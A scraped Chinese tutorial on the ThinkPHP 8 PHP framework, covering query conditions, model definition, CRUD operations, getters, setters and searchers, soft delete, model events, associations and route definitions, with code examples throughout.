// 下面的代码无法控制优先级$user = Db::name(&quot;user&quot;)-&gt;where([    [&quot;gender&quot;, &quot;=&quot;, &quot;男&quot;],    [&quot;age&quot;, &quot;exp&quot;, Db::raw(&quot;&gt;=10 AND id&lt;5&quot;)]])-&gt;where(&quot;details&quot;, &quot;like&quot;, &quot;%我%&quot;)-&gt;select();// 外加一个中括号-&gt;where([[    ...]])    // 拼装返回的SQLSELECT * FROM `tp_user` WHERE ( `gender` = &quot;男&quot; AND ( `age` &gt;=10 AND id&lt;5 ) ) AND `details` LIKE &quot;%我%&quot;    // 推荐用变量代替$map =[    [&quot;gender&quot;, &quot;=&quot;, &quot;男&quot;],    [&quot;age&quot;, &quot;exp&quot;, Db::raw(&quot;&gt;=10 AND id&lt;5&quot;)]];-&gt;where([$map])

如果，条件中有多次出现一个字段，并且需要 OR 来左右筛选，可以用 whereOr；
// 多条件重复字段 OR 选项$map1 = [    [&quot;name&quot;, &quot;like&quot;, &quot;%王%&quot;],    [&quot;details&quot;, &quot;=&quot;, null]];$map2 = [    [&quot;gender&quot;, &quot;=&quot;, &quot;女&quot;],    [&quot;details&quot;, &quot;exp&quot;, Db::raw(&quot;IS NOT NULL&quot;)]];$user = Db::name(&quot;user&quot;)-&gt;whereOr([$map1, $map2])-&gt;select();// 拼装返回的SQLSELECT * FROM `tp_user` WHERE ( `name` LIKE &quot;%王%&quot; AND `details` IS NULL ) OR ( `gender` = &quot;女&quot; AND ( `details` IS NOT NULL ) )

模型定义定义模型
为了避免被前面课程中控制器的类名干扰，删除或改名都行：
// UserBak.php，目前不存在任何地方的User.php了class UserBak extends BaseController

定义一个和数据库表相匹配的模型，可在app应用目录下创建model文件夹；
namespace app\model;use think\Model;class User extends Model&#123;    &#125;

模型会自动对应数据表，并且有一套自己的命名规则；

模型类需要去除表前缀(tp_)，采用驼峰式命名，并且首字母大写；
tp_user(表名) =&gt; Usertp_user_type(表名) =&gt; UserType

在控制器段创建一个任意名称的类，当然有语义更好，但为了教学理解起名为：TestUser.php；
namespace app\controller;use app\model\User;// 注意：类名不限制class TestUser&#123;    public function index()    &#123;        return json(User::select());    &#125;&#125;

模型设置
系统会自动识别 模型类名 对应 表名，User.php  对应 user 表（不含前缀）；

但如果你的模型类名不是按照规则对应表名，则需要通过成员字段去设置；
class Abc extends Model&#123;    // 设置表名    protected $name = &quot;user&quot;;&#125;// 使用$table时，指定表时需要完整的表名：tp_user

系统也会默认id为你的主键名，如果不是id，则需要设置；
// 设置主键protected $pk = &quot;uid&quot;;

模型支持初始化功能，需要设置静态方法，并只在第一次实例化的时候执行，且只执行一次；
protected static function init()&#123;	echo &quot;初始化&quot;;&#125;

新增和删除新增操作
用模型新增数据，首先要实例化模型，开发工具会补全use，非集成工具别忘了；
use app\model\User;// 手册new User，这里括号是工具补全的，都可以$user = new User();

使用实例化的方式添加一条数据，并使用 save() 方法进行保存；

注意：使用模型时，会自动给时间字段 create_time，update_time（要有该字段）写入当前时间；
$user = new User();$user-&gt;name = &quot;李白&quot;;$user-&gt;age = 28;$user-&gt;gender = &quot;男&quot;;$user-&gt;details = &quot;床前明月光，好诗！&quot;;// 成功返回true，失败抛异常，其它看手册$user-&gt;save();

也可以通过 save() 传递数据数组的方式，来新增数据；
$user-&gt;save([    &quot;name&quot;  =&gt;  &quot;杜甫&quot;,    &quot;age&quot;   =&gt;  19,    &quot;gender&quot;  =&gt;  &quot;男&quot;,    &quot;details&quot; =&gt;  &quot;一行白鹭上青天，好诗！&quot;]);

使用 allowField() 方法，允许要写入的字段，其它字段就无法写入了；
$user-&gt;allowField([&quot;name&quot;,&quot;age&quot;,&quot;gender&quot;])-&gt;save([    &quot;name&quot;  =&gt;  &quot;蒲松龄&quot;,    &quot;age&quot;   =&gt;  25,    &quot;gender&quot;  =&gt;  &quot;男&quot;,    &quot;details&quot; =&gt;  &quot;十里平湖霜满天，好诗！&quot;]);

模型新增也提供了 replace() 方法来实现 REPLACE into 新增；
$user-&gt;replace()-&gt;save([    &quot;id&quot;    =&gt;  15,    &quot;name&quot;  =&gt;  &quot;蒲松龄&quot;,    &quot;age&quot;   =&gt;  25,    &quot;gender&quot;  =&gt;  &quot;男&quot;,    &quot;details&quot; =&gt;  &quot;十里平湖霜满天，好诗！&quot;]);

当新增成功后，使用 $user-&gt;id ，可以获得自增 ID（主键需是 id）；
return $user-&gt;id;

使用 saveAll()方法，可以批量新增数据，返回批量新增的数组；
return $user-&gt;saveAll([    [        &quot;name&quot;  =&gt;  &quot;赵六&quot;,        &quot;age&quot;   =&gt;  19,        &quot;gender&quot;=&gt;  &quot;男&quot;    ],    [        &quot;name&quot;  =&gt;  &quot;钱七&quot;,        &quot;age&quot;   =&gt;  22,        &quot;gender&quot;=&gt;  &quot;男&quot;,        &quot;details&quot;   =&gt;  &quot;我很有钱，排行老七！&quot;    ]]);

使用 ::create() 静态方法，来创建要新增的数据；
$user = User::create([    &quot;name&quot;  =&gt;  &quot;李逍遥&quot;,    &quot;age&quot;   =&gt;  18,    &quot;gender&quot;=&gt;  &quot;男&quot;,    &quot;details&quot;   =&gt;  &quot;我是一代主角！&quot;], [&quot;name&quot;, &quot;age&quot;, &quot;gender&quot;, &quot;details&quot;], false);//参数 1 是新增数据数组，必选//参数 2 是允许写入的字段，可选//参数 3 为是否 replace 写入，可选，默认 false 为 Insert 写入return $user-&gt;id;

删除操作
使用 find() 方法，通过主键 (id) 查询到想要删除的数据；

然后再通过 delete()方法，将数据删除，返回布尔值；
// 根据主键值，删除数据$user = User::find(20);return $user-&gt;delete();

也可以使用静态方法调用 destroy()方法，通过主键(id)删除数据；
// 单条删除return User::destroy(21);// 批量删除return User::destroy([22, 33, 44]);// 条件删除return User::where(&quot;id&quot;, &quot;&gt;&quot;, 15)-&gt;delete();（返回删除的条目数）

destroy() 方法，使用闭包的方式进行删除；
// 闭包模式User::destroy(function ($query) &#123;    $query-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 15);&#125;);

更新数据更新
使用 find()方法获取数据，然后通过 save()方法保存修改，返回布尔值；
$user = User::find(19);$user-&gt;details = &quot;我是一代主角！&quot;;return $user-&gt;save();

通过 where()方法结合 find()方法的查询条件获取的数据，进行修改；
$user = User::where(&quot;name&quot;, &quot;李逍遥&quot;)-&gt;find();$user-&gt;details = &quot;我想做二代主角！&quot;;return $user-&gt;save();

save()方法只会更新变化的数据，如果提交的修改数据没有变化，则不更新；

但如果你想强制更新数据，即使数据一样，那么可以使用 force()方法；
// 如何验证被强制了，查看update_time字段是否更新了$user-&gt;force()-&gt;save();

Db::raw()执行 SQL 函数的方式，同样在这里有效；
$user-&gt;age = Db::raw(&quot;age + 2&quot;);

关于验证过滤，后续学习Request再说，手册中 模型 -&gt; 更新 里也有说明：
$user-&gt;allowField([&quot;name&quot;,&quot;age&quot;])-&gt;save(...)

通过 saveAll()方法，可以批量修改数据，返回被修改的数据集合；
$user = new User;return $user-&gt;saveAll([    [&quot;id&quot;=&gt;17, &quot;gender&quot;=&gt;&quot;女&quot;],    [&quot;id&quot;=&gt;18, &quot;gender&quot;=&gt;&quot;女&quot;],    [&quot;id&quot;=&gt;19, &quot;gender&quot;=&gt;&quot;女&quot;],]);

使用静态方法::update()更新，返回的是对象实例；
return User::update([&quot;id&quot;=&gt;17, &quot;gender&quot;=&gt;&quot;男&quot;]);// ID放在后面，返回数据不含IDreturn User::update([&quot;gender&quot;=&gt;&quot;男&quot;], [&quot;id&quot;=&gt;18]);// 限制更新的内容，只允许gender被修改return User::update([&quot;gender&quot;=&gt;&quot;男&quot;, &quot;name&quot;=&gt;&quot;可笑的人&quot;], [&quot;id&quot;=&gt;19], [&quot;gender&quot;]);

查询其实和数据库的查询大差不差
模型的查询
模型的绝大部分语法基本都来自于 Db::name() 的查询：

在手册 模型 -&gt; 查询 中可以查阅，这里就演示几个常用的意思一下：

find() 单个 和 select() 多个;
$user = User::find(1);$user = User::select();$user = User::select([1, 3, 5]);

也可以使用 where()方法进行条件筛选查询数据；
$user = User::where(&quot;id&quot;, &quot;&lt;&quot;, 5)-&gt;select();

$user = User::where(&#x27;name&#x27;, &#x27;thinkphp&#x27;)-&gt;find();

模型方法也可以使用 where 等连缀查询，和数据库查询方式一样；
$user = User::limit(3)-&gt;order(&quot;id&quot;, &quot;desc&quot;)-&gt;select();

模型支持聚合查询：max、min、sum、count、avg 等；
$user = User::count();

模型也支持大量的快捷方式，这里演示一个：
$user = User::whereLike(&quot;name&quot;, &quot;%王%&quot;)-&gt;select();

模型的字段设置字段设置
模型的数据字段和表字段是对应关系，默认会自动获取，包括字段的类型；

自动获取会导致增加一次查询，如果在模型中配置字段信息，会减少内存开销；

可以在模型设置$schema 字段，明确定义字段信息，字段需要对应表写完整；

字段类型的定义可以使用PHP类型或者数据库的字段类型都可以，以便自动绑定类型；
// 设置字段信息，需要写完整的数据表字段protected $schema = [    &quot;id&quot;    =&gt;  &quot;int&quot;,    &quot;name&quot;  =&gt;  &quot;string&quot;,    ...];

设置模型字段，只能对模型有效，对于 Db::name() 查询无法作用。

要让模型和Db查询都支持字段类型设置，分三步：

把上面的$schema先注释掉；

在 config&#x2F;database.php 开启缓存字段；
// 开启字段缓存&quot;fields_cache&quot;    =&gt; true,

在根目录命令行执行命令：
php think optimize:schema



废弃字段
由于历史遗留问题，我们不再想使用某些字段，可以在模型里设置；

设置后，我们在查询和写入时将忽略这些字段；
// 设置废弃字段protected $disuse = [&quot;age&quot;, &quot;details&quot;];

只读字段
只读字段用来保护某些特殊的字段值不被更改，这个字段的值一旦写入，就无法更改；
// 设置只读字段protected $readonly = [&quot;age&quot;, &quot;details&quot;];

然后在控制器端进行修改测试：
// 修改查看只读字段return User::update([&quot;id&quot;=&gt;19, &quot;age&quot;=&gt;22, &quot;name&quot;=&gt;&quot;李逍遥2&quot;, &quot;details&quot;=&gt;&quot;可笑&quot;]);

获取器和修改器获取器
获取器的作用是对模型实例的数据做出自动处理；

一个获取器对应模型的一个特殊方法，该方法为 public；

方法名的命名规范为：getFieldAttr()；

举个例子，数据库表示状态 status 字段采用的是数值；

而页面上，我们需要输出 status 字段希望是中文，就可以使用获取器；

在 User 模型端，我创建一个对外的方法，如下：
// 获取器，改变字段的值public function getStatusAttr($value)&#123;    $status = [-1=&gt;&quot;删除&quot;, 0=&gt;&quot;冻结&quot;, 1=&gt;&quot;正常&quot;, 2=&gt;&quot;待审核&quot;];    return $status[$value];&#125;

控制器端，正常输出数据：
public function attr()&#123;    $user = User::select();    return json($user);&#125;

如果你定义了获取器，并且想获取原始值，可以使用 getData()方法；
$user = User::find(1);echo $user-&gt;getData(&quot;status&quot;);

使用 withAttr 在控制器端实现动态获取器，比如让年龄+100岁；
// 可以传入参数二 $data，获得所有数据，方便数据获取和判断$user = User::select()-&gt;withAttr(&quot;age&quot;, function($value) &#123;    return $value + 100;&#125;);

修改器
模型修改器的作用，就是对模型设置对象的值进行处理；

比如，我们要新增数据的时候，对数据就行格式化、过滤、转换等处理；

模型修改器的命名规则为：setFieldAttr；

我们要设置一个新增，规定输入的年龄都自动+100岁，修改器如下：
// 修改器，写入时改变字段的值public function setAgeAttr($value)&#123;    return $value + 100;&#125;

return User::create([    &quot;name&quot;  =&gt;  &quot;酒剑仙&quot;,    &quot;age&quot;   =&gt;  58,    &quot;gender&quot;=&gt;  &quot;男&quot;,    &quot;details&quot;   =&gt;  &quot;我是隐藏主角！&quot;]);

除了新增，会调用修改器，修改更新也会触发修改器；

模型修改器只对模型方法有效，调用数据库的方法是无效的，比如-&gt;insert();


搜索器和自动时间戳搜索器
搜索器是用于封装字段（或搜索标识）的查询表达式，类似查询范围；

一个搜索器对应模型的一个特殊方法，该方法为 public；

方法名的命名规范为：**searchFieldAttr()**；

举个例子，我们要封装一个 name 字段的模糊查询，然后封装一个时间限定查询；

在 User 模型端，我创建两个对外的方法，如下：
// 搜索器，模糊查找姓名public function searchNameAttr($query, $value, $data)&#123;    $query-&gt;where(&quot;name&quot;, &quot;like&quot;, &quot;%&quot;.$value.&quot;%&quot;);&#125;// 搜索器，限定时间public function searchCreateTimeAttr($query, $value, $data)&#123;    $query-&gt;whereBetweenTime(&quot;create_time&quot;, $value[0], $value[1]);&#125;

在控制器端，通过 withSearch()方法实现模型搜索器的调用；
$user = User::withSearch([&quot;name&quot;, &quot;create_time&quot;],[    &quot;name&quot;          =&gt;  &quot;李&quot;,    &quot;create_time&quot;   =&gt;  [&quot;2023-10-19&quot;, &quot;2023-10-20 23:59:59&quot;]])-&gt;select();

withSearch()中第一个数组参数，限定搜索器的字段，第二个则是表达式值；

如果想在搜索器查询的基础上再增加查询条件，直接使用链式查询即可；
User::withSearch(...)-&gt;where(&quot;gender&quot;, &quot;女&quot;)-&gt;select();

在获取器和修改器都有一个 $data 参数，它的作用是什么？
// 搜索器，模糊查找姓名public function searchNameAttr($query, $value, $data)&#123;    //$halt($data);    $query-&gt;where(&quot;name&quot;, &quot;like&quot;, &quot;%&quot;.$value.&quot;%&quot;);    // 按年龄排序    if (isset($data[&quot;sort&quot;])) &#123;        $query-&gt;order($data[&quot;sort&quot;]);    &#125;&#125;

自动时间戳
如果你想全局开启，在 database.php 中，设置为 true；

此时，写入操作时，会自动对 create_time 和 update_time 进行写入；
&quot;auto_timestamp&quot;  =&gt; true,

如果你只想设置某一个模型开启，需要设置特有字段；
protected $autoWriteTimestamp = true;

自动时间戳只能在模型下有效，数据库方法不可以使用；

如果创建和修改时间戳不是默认定义的，也可以自定义；
protected $createTime = &quot;create_at&quot;;protected $updateTime = &quot;update_at&quot;;

如果业务中只需要 create_time 而不需要 update_time，可以关闭它；
protected $updateTime = false;

也可以动态实现不修改 update_time，具体如下：
$user-&gt;isAutoWriteTimestamp(false)-&gt;save();

软删除和事件软删除
软删除也称为逻辑删除，只是给数据标记 “已删除” 的状态，不是真实的物理删除；

为何要对数据进行软删除，因为真实的物理删除，删了就没了呀。

在模型端设置软删除的功能，引入 SoftDelete，它是 trait；
// 会自动引入SoftDeleteuse think\model\concern\SoftDelete;// 开启软删除，创建delete_time字段，并设置默认为 NULLuse SoftDelete;protected $deleteTime = &quot;delete_time&quot;;

delete_time 默认设置的是 null，如果你想更改这个默认值，可以设置：
protected $defaultSoftDelete = 0;


由于我们之前演示过字段缓存，会导致无法软删除，你可以删除字段缓存，或者重新更新下：
php think optimize:schema

删除分为两种：destroy() 和 delete()，具体如下：
// 软删除User::destroy(1);// 真实删除User::destroy(1,true);$user = User::find(1);// 软删除$user-&gt;delete();// 真实删除$user-&gt;force()-&gt;delete();

软删除后，数据库内的数据只是被标记了删除时间，而搜索数据时，会自动屏蔽这些数据；

在开启软删除功能的前提下，使用 withTrashed() 方法取消屏蔽软删除的数据；
User::withTrashed()-&gt;select();

如果只想查询被软删除的数据，使用 onlyTrashed()方法即可；
User::onlyTrashed()-&gt;select()

如果想让某一条被软删除的数据恢复到正常数据，可以使用 restore()方法；
$user = User::onlyTrashed()-&gt;find(23);$user-&gt;restore();

如果要将软删除后的数据库真实的物理删除，需要先将它恢复，再真实删除；


事件模型事件是指在进行模型的查询和写入操作的时候触发的操作行为。

模型事件只在调用模型的方法生效，使用查询构造器操作是无效的

模型支持如下事件：



事件
描述
事件方法名



after_read
查询后
onAfterRead


before_insert
新增前
onBeforeInsert


after_insert
新增后
onAfterInsert


before_update
更新前
onBeforeUpdate


after_update
更新后
onAfterUpdate


before_write
写入前
onBeforeWrite


after_write
写入后
onAfterWrite


before_delete
删除前
onBeforeDelete


after_delete
删除后
onAfterDelete


before_restore
恢复前
onBeforeRestore


after_restore
恢复后
onAfterRestore


注册的回调方法支持传入一个参数（当前的模型对象实例），但支持依赖注入的方式增加额外参数。

如果before_write、before_insert、 before_update 、before_delete事件方法中返回false或者抛出think\exception\ModelEventException异常的话，则不会继续执行后续的操作。

模型事件定义最简单的方式是在模型类里面定义静态方法来定义模型的相关事件响应。
&lt;?phpnamespace app\model;use think\Model;use app\model\Profile;class User extends Model&#123;    public static function onBeforeUpdate($user)    &#123;    	if (&#x27;thinkphp&#x27; == $user-&gt;name) &#123;        	return false;        &#125;    &#125;        public static function onAfterDelete($user)    &#123;		Profile::destroy($user-&gt;id);    &#125;&#125;

参数是当前的模型对象实例，支持使用依赖注入传入更多的参数。
写入事件onBeforeWrite和onAfterWrite事件会在新增操作和更新操作都会触发.
具体的触发顺序:
// 执行 onBeforeWrite// 如果事件没有返回`false`,那么继续执行// 执行新增或更新操作(onBeforeInsert/onAfterInsert或onBeforeUpdate/onAfterUpdate)// 新增或更新执行成功// 执行 onAfterWrite

注意:模型的新增或更新是自动判断的.
关联模型入门关联表
我们已经有了一张 tp_user 表，主键为：id；我们需要一个附属表，来进行关联；

附属表：tp_profile，建立两个字段：user_id 和 hobby，外键是 user_id；



关联查询
关联模型，顾名思义，就是将表与表之间进行关联和对象化，更高效的操作数据；

创建 User 模型和 Profile 模型，均为空模型；如果已有User，改名UserBak备份起来；
namespace app\model;use think\Model;class User extends Model &#123;&#125;

namespace app\model;use think\Model;class Profile extends Model &#123;&#125;

User 模型端，需要关联 Profile，具体方式如下：
class User extends Model &#123;    public function profile()    &#123;        // 一对一关联，        // 参数1：关联的表模型        // 参数2：默认为 user_id (外键)        return $this-&gt;hasOne(Profile::class);    &#125;&#125;

创建一个控制器用于测试输出：Link.php；
public function index()&#123;    // 主表    $user = User::find(19);    // 访问关联从表    return json($user-&gt;profile);&#125;

一对一关联查询hasOne 模式
hasOne 模式，适合主表关联附表，具体设置方式如下：
class User extends Model&#123;    // 定义与Profile模型的一对一关系    public function profile()    &#123;        return $this-&gt;hasOne(&#x27;Profile&#x27;, &#x27;user_id&#x27;, &#x27;id&#x27;);//返回模型实例    &#125;&#125;//关联模型（必须）：关联的模型名或者类名//外键：默认的外键规则是当前模型名（不含命名空间，下同）+_id ，例如 user_id//主键：当前模型主键，默认会自动获取也可以指定传入

我们了解了表与表关联后，实现的查询方案：
// 主表$user = User::find(19);// 访问关联从表return json($user-&gt;profile-&gt;hobby);

使用 save()方法，可以设置关联修改，通过主表修改附表字段的值：
$user = User::find(19);return $user-&gt;profile-&gt;save([&quot;hobby&quot;=&gt;&quot;和蛇妖玩耍！&quot;]);

-&gt;profile 属性方式可以修改数据，-&gt;profile()方法方式可以新增数据：
// 新增附表数据，先找到主表数据$user = User::find(1);// 然后通过profile()方法实现新增return $user-&gt;profile()-&gt;save([&quot;hobby&quot;=&gt;&quot;不喜欢吃青椒！&quot;]);

belongsTo 模式
belongsTo 模式，适合附表关联主表，具体设置方式如下:
// 注意：此时绑定需要Profile模型创建user()方法执行belongsTo(&quot;关联模型&quot;,[&quot;外键&quot;,&quot;关联主键&quot;]);class Profile extends Model &#123;    public function user()    &#123;        return $this-&gt;belongsTo(User::class);    &#125;&#125;

查询方式，和主附查询方式一致：
// 附表$profile = Profile::find(1);// 访问关联主表return $profile-&gt;user-&gt;name;

使用 hasOne()也能模拟 belongsTo() 来进行查询，这样就可以不用在 Profile 模型进行设置：
// hasWhere// 注意：参数1的profile是方法名，不是模型名$user = User::hasWhere(&quot;profile&quot;, [&quot;id&quot;=&gt;2])-&gt;find();return json($user);// 闭包方式$user = User::hasWhere(&quot;profile&quot;, function ($query) &#123;    $query-&gt;where(&quot;id&quot;, 2);&#125;)-&gt;find();return json($user);

一对多关联查询hasMany 模式
hasMany 模式，适合主表关联附表，实现一对多查询，具体设置方式如下：
// 由于是一对多，需要在附表添加多个相同user_id的数据测试hasMany(&quot;关联模型&quot;,[&quot;外键&quot;,&quot;主键&quot;]);return $this-&gt;hasMany(Profile::class,&quot;user_id&quot;, &quot;id&quot;);

查询方案和一对一相同：
// 主表一对多$user = User::find(1);return json($user-&gt;profile);

使用-&gt;profile()方法模式，可以进一步进行数据的筛选；
// 主表一对多$user = User::find(1);// 进一步筛选数据，保留实际顺序的下标$data = $user-&gt;profile-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 10);// 进一步筛选数据，下标重新从0开始，需要连缀select()$data = $user-&gt;profile()-&gt;where(&quot;id&quot;, &quot;&gt;&quot;, 10)-&gt;select();return json($data);

使用 has()方法，查询关联附表的主表内容，比如大于等于 2 条的主表记录；
// 参数1：profile是方法名$user = User::has(&quot;profile&quot;, &quot;&gt;=&quot;, 2)-&gt;select();return json($user);

使用 hasWhere()方法，查询附表中，可见兴趣的主表记录；
// 查询附表profile中visible为1的兴趣关联主表的记录$user = User::hasWhere(&quot;profile&quot;, [&quot;visible&quot;=&gt;1])-&gt;select();return json($user);

使用 save()和 saveAll()进行关联新增和批量关联新增，方法如下：
// 主表数据$user = User::find(24);// 新增附表关联数据$user-&gt;profile()-&gt;save([&quot;hobby&quot;=&gt;&quot;测试喜欢1&quot;, &quot;visible&quot;=&gt;1]);// 批量新增$user-&gt;profile()-&gt;saveAll([    [&quot;hobby&quot;=&gt;&quot;测试喜欢2&quot;, &quot;visible&quot;=&gt;1],    [&quot;hobby&quot;=&gt;&quot;测试喜欢3&quot;, &quot;visible&quot;=&gt;1],]);

使用 together()方法，可以删除主表内容时，将附表关联的内容全部删除；
// 删除主数据，并清空关联附表数据$user = User::with(&quot;profile&quot;)-&gt;find(29);$user-&gt;together([&quot;profile&quot;])-&gt;delete();

特别注意：由于外键约束设置问题，默认情况下，关联操作可能会导致1451错误；

解决方案：在 profile 表中 设置外键 删除和修改时 为：CASCADE即可，详细阅读如下：
https://blog.csdn.net/qq_23994787/article/details/86063623

模型预载入和统计预载入
在普通的关联查询下，我们循环数据列表会执行 n+1 次 SQL 查询；
// 主表三条记录$list = User::select([10, 11, 12]);// 遍历附表foreach ($list as $user)&#123;    dump($user-&gt;profile);&#125;

上面继续采用普通关联查询的构建方式，打开 trace 调试工具，会得到四次查询；

如果采用关联预载入的方式，将会减少到两次，也就是起步一次，循环一次；
$list = User::with([&quot;profile&quot;])-&gt;select([10, 11, 12, 17, 18, 19]);foreach ($list as $user)&#123;    dump($user-&gt;profile);&#125;

// 查看显示结构$list = User::with([&quot;profile&quot;])-&gt;select([1, 10, 22]);return json($list);

关联预载入减少了查询次数提高了性能，但是不支持多次调用；

如果你有主表关联了多个附表，都想要进行预载入，可以传入多个模型方法即可；
User::with([&quot;profile&quot;, &quot;book&quot;])

上面显示结构中，主表和附表的字段已经非常多了，需要对两个表字段进行筛略：
// 注意1：withField对应另一个是withoutField// 注意2：关联字段一定要包含外键：user_id，否则空$list = User::field(&quot;id,age,gender,details&quot;)-&gt;with([&quot;profile&quot; =&gt; function($query) &#123;    $query-&gt;withField([&quot;user_id, hobby&quot;]);&#125;])-&gt;select([1, 10, 22]);return json($list);// 或者简单些$list = User::with(&quot;profile&quot;)-&gt;select();// 直接字段，隐藏主表，加上profile隐藏附表，除了hidden，还有对应的visible方法return json($list-&gt;hidden([&quot;status&quot;, &quot;profile.visible&quot;]));

还有一些 预载入缓存、延迟预载入，可以参考手册；


关联统计
使用 withCount()方法，可以统计主表关联附表的个数，输出用 profile_count；
// 统计这三条数据关联的附表数据的个数$list = User::withCount([&quot;profile&quot;])-&gt;select([1, 10, 22]);foreach ($list as $user)&#123;    echo $user-&gt;profile_count.&quot;&lt;br&gt;&quot;;&#125;

关联统计的输出采用“关联方法名” _count，这种结构输出；

不单单支持 Count，还有如下统计方法，均可支持；

**withMax()、withMin()、withSum()、withAvg()**等；

除了 withCount()不需要指定字段，其它均需要指定统计字段；
// 统计附表关联字段的累加和$list = User::withSum([&quot;profile&quot;], &quot;visible&quot;)-&gt;select([1, 10, 22]);foreach ($list as $user) &#123;    echo $user-&gt;profile_sum.&quot;&lt;br&gt;&quot;;&#125;

对于输出的属性，可以自定义：
User::withSum([&quot;profile&quot;=&gt;&quot;p_s&quot;], &quot;visible&quot;)$user-&gt;p_s

多对多关联查询建立三张表
复习一下一对一，一个用户对应一个用户档案资料，是一对一关联；

复习一下一对多，一篇文章对应多个评论，是一对多关联；

多对多怎么理解，分解来看，一个用户对应多个角色，而一个角色对应多个用户；

那么这种对应关系，就是多对多关系，最经典的应用就是权限控制；




tp_user：用户表；tp_role：角色表；tp_access：中间表；

access 表包含了 user 和 role 表的关联 id，多对多模式；
class User extends Model &#123;    public function role()    &#123;        // belongsToMany(&quot;关联模型&quot;,&quot;中间表&quot;,[&quot;外键&quot;,&quot;关联键&quot;]);        return $this-&gt;belongsToMany(Role::class, Access::class);    &#125;&#125;

class Role extends Model&#123;&#125;

// 这里继承的是Pivot，它本身也继承了Model// Pivoit是中间表基类，多对多专用模型class Access extends Pivot&#123;&#125;

权限控制
在控制器段，我们查询一下id为1的用户，并关联查询它的权限：
// 获取一个用户，张三$user = User::find(1);// 获取这个用户所有角色$role = $user-&gt;role;return json($role);

当我们要给一个用户创建一个角色时，用到多对多关联新增；
// 如果这个角色不存在，则会给角色表增加一条信息// 并且，会在中间表关联角色和用户$user-&gt;role()-&gt;save([&quot;type&quot;=&gt;&quot;测试管理专员&quot;]);// 也支持批量$user-&gt;role()-&gt;saveAll([[...],[...]]);

一般来说，上面的这种新增方式，用于初始化角色比较合适；

但是，很多情况下，角色权限是初始化好的，只需要添加中间表，而不是角色表；

那么，我们真正需要就是通过用户表新增到中间表关联即可；
// 给张三添加一个已经存在的角色，直接传角色ID即可$user-&gt;role()-&gt;save(1);// 或$user-&gt;role()-&gt;save(Role::find(1));$user-&gt;role()-&gt;saveAll([1,2,3]); // 或，如果有其它字段，可以通过中括号添加$user-&gt;role()-&gt;attach(1);$user-&gt;role()-&gt;attach(2, [&quot;details&quot;=&gt;&quot;测试详情&quot;]);

除了新增，还有直接删除中间表数据的方法：
// 取消掉张三的所有，1，2，6，这里的值是角色的ID，不是中间表ID$user-&gt;role()-&gt;detach(1);$user-&gt;role()-&gt;detach([2, 6]);

路由定义路由入门
路由的作用就是让 URL 地址更加的规范和优雅，或者说更加简洁；

设置路由对 URL 的检测、验证等一系列操作提供了极大的便利性；

路由是默认开启的，如果想要关闭路由，在 config&#x2F;app.php 配置；
// 是否启用路由&quot;with_route&quot;       =&gt; true,

路由的配置文件在 config&#x2F;route.php 中，定义文件在 route&#x2F;app.php；

我们还回到最初的 Index 控制器，创建一个 details 带 参数的方法；
public function details($id)&#123;    return &quot;details ID：&quot;.$id;&#125; 

http://www.tp.com:8000/index/details/id/5

此时，我们在根目录 route 下的 app.php 里配置路由：
// 参数1：url/参数// 参数2：控制器/方法Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;);// 访问地址http://www.tp.com:8000/details/5

rule()方法是默认请求是 any，即任何请求类型均可，第三参数可以限制：
Route::rule(&quot;details/:id&quot;, &quot;Index/xxx&quot;, &quot;GET&quot;);Route::rule(&quot;details/:id&quot;, &quot;Index/xxx&quot;, &quot;POST&quot;);Route::rule(&quot;details/:id&quot;, &quot;Index/xxx&quot;, &quot;GET|POST&quot;);

所有的请求方式均有快捷方式，比如 ::get() 、**::post()** 等，具体查看手册：路由 -&gt; 路由定义；
// 快捷方式，无须第三参数了Route::get(...)Route::post(...)Route::delete(...)

在路由的规则表达式中，有多种地址的配置规则：
// 静态路由Route::rule(&quot;test&quot;, &quot;Index/test&quot;);// 带一个参数Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;);// 带两个参数Route::rule(&quot;details/:id/:uid&quot;, &quot;Index/details&quot;);// 带可选参数，一般在后面Route::rule(&quot;details/:id/[:uid]&quot;, &quot;Index/details&quot;);// 全动态地址，不限定details，url可以是：abc/5/6，后面details也可以动态Route::rule(&quot;:details/:id/:uid&quot;, &quot;Index/details&quot;);// 正则规则，完全匹配Route::rule(&quot;details/:id/:uid$&quot;, &quot;Index/details&quot;);

强制路由
目前来说，路由访问模式和URL访问模式都可以使用，但我们强制路由访问；

开始强制路由，需要在 route.php 里面进行配置：
// 是否强制使用路由&quot;url_route_must&quot;        =&gt; true,

// 首页也必须设置路由Route::rule(&quot;/&quot;, &quot;Index/index&quot;);

完全匹配规则匹配检测的时候默认只是对URL从头开始匹配，只要URL地址开头包含了定义的路由规则就会匹配成功，如果希望URL进行完全匹配，可以在路由表达式最后使用$符号，例如：
Route::get(&#x27;new/:cate$&#x27;, &#x27;News/category&#x27;);

这样定义后
http://serverName/index.php/new/info

会匹配成功,而
http://serverName/index.php/new/info/2

则不会匹配成功。
如果是采用
Route::get(&#x27;new/:cate&#x27;, &#x27;News/category&#x27;);

方式定义的话，则两种方式的URL访问都可以匹配成功。
如果需要全局进行URL完全匹配，可以在路由配置文件中设置
// 开启路由完全匹配&#x27;route_complete_match&#x27;   =&gt; true,

开启全局完全匹配后，如果需要对某个路由关闭完全匹配，可以使用
Route::get(&#x27;new/:cate&#x27;, &#x27;News/category&#x27;)-&gt;completeMatch(false);

路由闭包和变量规则闭包
闭包支持我们可以通过 URL 直接执行，而不需要通过控制器和方法；
// 闭包Route::get(&quot;think&quot;, function () &#123;    return &quot;hello, ThinkPHP8!&quot;;&#125;);

闭包支持也可以传递参数和动态规则：
// 带参数闭包，如果不带:version，那么地址：php?version=8Route::get(&quot;php/:version&quot;, function ($version) &#123;    return &quot;PHP&quot;.$version;&#125;);

变量规则
系统默认的路由变量规则为\w+，即字母、数字、中文和下划线；

如果你想更改默认的匹配规则，可以修改 config&#x2F;route.php 配置；
// 默认的路由变量规则&quot;default_route_pattern&quot; =&gt; &quot;[\w\.]+&quot;,

如果我们需要对于具体的变量进行单独的规则设置，则需要通过 pattern() 方法；

将 details 方法里的 id 传值，严格限制必须只能是数字\d+；
// 正则规则 \d+ 限定id为数字Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;)            -&gt;pattern([&quot;id&quot;=&gt;&quot;\d+&quot;]);// 多个参数-&gt;pattern([    &quot;id&quot;  =&gt; &quot;\d+&quot;,    &quot;uid&quot; =&gt; &quot;\d+&quot;]);

